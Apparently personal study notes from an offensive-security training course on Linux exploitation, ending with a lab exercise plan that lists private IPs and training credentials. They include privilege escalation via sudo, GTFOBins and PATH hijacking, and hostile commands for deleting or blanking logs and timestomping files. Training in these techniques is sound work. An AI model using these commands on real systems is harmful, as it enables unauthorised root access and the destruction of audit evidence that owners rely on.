Linux Exploitation:

IMPORTANT:
sudo -l
    SHOWS WHAT I CAN SUDO!!!!!!!!

persistance:
crontabs
    Requres root privs
    Look at what the jobs are running. Might be able to replace that stuff.     
    crontab.guru  --  crontab format helper. 

look for "." in the $PATH variable so you might be able to slip something in there.

look for unpatched kernel vulnerabilities. 

rsyslogd is for remote logging.

artifacts = leftovers, things that could trace back to you.

HISTFILE = history

auditing systemV:
    ausearch  --  pulls from audit.log
    
/var/log:

Logs typically housed in /var/log & useful logs:
    auth.log/secure  =  Logins/authentications
    lastlog  =  Each users' last successful login time
    btmp  =  Bad login attempts
    sulog  =  Usage of SU command
    utmp  =  Currently logged in users (W command)
    wtmp  =  Permanent record on user on/off

Working with logs:
    file /var/log/wtmp
    find /var/log -type f -mmin -10 2> /dev/null
    journalctl -f -u ssh
    journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4


Cleaning/clearing logs:
    Get rid of it
    rm -rf /var/log/...
    
    Clear It
    cat /dev/null > /var/log/...
    echo " " > /var/log/...

Timestomp:
    Timestomp (Nix)
    Easy with Nix vs Windows (Native change of Access & Modify times)
    touch -c -t 201603051015 1.txt   # Explicit
    touch -r 3.txt 1.txt    # Reference


Rsyslog:
    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
    Older version only uses /etc/rsyslog.conf`
    Find out
    grep "IncludeConfig" /etc/rsyslog.conf
    ****THIS IS HOW TO FIND OUT WHERE LOGS ARE BEING SENG****
    
    reading rsyslog:
        <facility>.<priority>       @192.168.<wherever it's going>
    




DEMO TIME!!!

sudo -l
    *shows what i can sudo

GTFO bins
    *website that has binaries to privelege escalate.

sudo apt-get is possible

/usr/bin/apt-get

then you can just type :!/bin/bash


finding suid bit:
find / -type f -perm /4000 -ls 2>/dev/null

Now I can put these in gtfo bins


PATH MANIPULATION:
PATH=.:$PATH
    *now the first thing it'll look for is stuff in the current directory.
    



ACTIVITY NOTES::

Scheme of Maneuver:
>Jump Box: 10.50.34.91
->Pivot:192.168.28.105
--->T1: 192.168.28.27
--->T2: 192.168.28.12

Target Section:

Pivot
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
PSP: rkhunter
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: unknown
IP: 192.168.28.27
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

T2
Hostname: unknown
IP: 192.168.28.12
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.




































